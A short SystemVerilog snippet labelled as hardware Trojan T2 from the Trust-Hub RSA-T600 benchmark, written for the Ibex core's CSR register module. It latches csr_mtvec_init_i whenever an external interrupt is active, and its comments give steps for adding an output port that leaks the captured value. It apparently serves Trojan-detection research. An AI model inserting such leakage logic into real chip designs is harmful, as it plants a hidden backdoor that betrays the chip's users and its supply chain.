
// ========== TROJAN T2: Information Leakage ==========
// Trust-Hub RSA-T600
// Module: ibex_cs_registers
// Type: Sequential
// Description: Leaks csr_mtvec_init_i when irq_external_i is active

// Trojan signals
logic [0:0] trojan_T2_leaked_data;

// Trojan logic
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        trojan_T2_leaked_data <= '0;
    end else begin
        // Capture secret data when trigger is active
        if (irq_external_i) begin
            trojan_T2_leaked_data <= csr_mtvec_init_i;
        end
    end
end

// MANUAL INSERTION REQUIRED:
// Add an output port to leak the data:
//   output logic [0:0] trojan_T2_leak_port_o;
// Then assign:
//   assign trojan_T2_leak_port_o = trojan_T2_leaked_data;

// ========== TROJAN T2 END ==========
